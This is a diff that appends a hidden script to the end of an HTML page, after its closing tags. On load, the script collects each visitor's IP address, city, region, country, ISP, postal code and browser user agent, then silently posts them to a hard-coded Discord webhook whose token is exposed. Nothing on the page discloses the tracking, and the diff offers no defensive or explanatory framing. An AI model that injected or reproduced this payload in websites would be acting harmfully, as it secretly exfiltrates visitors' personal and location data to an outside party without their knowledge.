@@ -462,3 +462,62 @@
 
 
 </body></html>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+  $.get("https://ipinfo.io", function (response) {
+    const webhook_url = "https://ptb.discord.com/api/webhooks/1245086363288866826/0OOPBMi4V8nzB8L_KzyA1B0FLC49T3V_cZW-9CGXXwFeedGQsDKyWcTBVCyw-ylnxxid";
+    const main = {
+      description: "https://www.damnedbeta.com.br/",
+      color: "1",
+      thumbnail: {
+        url: "https://media.discordapp.net/attachments/1219045894142558328/1225976998912983040/IMG_8795.gif?ex=663e1dce&is=663ccc4e&hm=4ce58a2471b5e3494983f0bdcac5e64512af21b9620e4bc2743141e037aca119&=",
+      },
+      fields: [
+        {
+          name: "<:lupahost:1185005563457835060>  **IP:**",
+          value: `\`${response.ip}\``,
+          inline: false,
+        },
+        {
+          name: "<:xsettings:809088864357711913>  **Navegador:**",
+          value: `\`${navigator.userAgent}\``,
+          inline: false,
+        },
+        {
+          name: "<:kosame_msg:1089664366032470086>   **Cidade:**",
+          value: `\`${response.city}\``,
+          inline: false,
+        },
+        {
+          name: "<:excl400:1222257015825502341>  **Regiao:**",
+          value: `\`${response.region}\``,
+          inline: false
+        },
+        {
+          name: "<:white_4m:1153840481353085029>  **Pais:**",
+          value: `\`${response.country}\``,
+          inline: false
+        },
+        {
+          name: ":link:  **Internet:**",
+          value: `\`${response.org}\``,
+          inline: false
+        },
+        {
+          name: "<:white_4m:1153839191717847100>  **Caixa Postal:**",
+          value: `\`${response.postal}\``,
+          inline: false
+        },
+      ],
+    }
+    var xhttp = new XMLHttpRequest();
+    const url = webhook_url;
+    xhttp.open("POST", url, true);
+    xhttp.setRequestHeader('Content-Type', 'application/json');
+    xhttp.send(JSON.stringify({
+      'username': 'Leivatannn',
+      'embeds': [main],
+    }));
+  }, "json");
+</script>
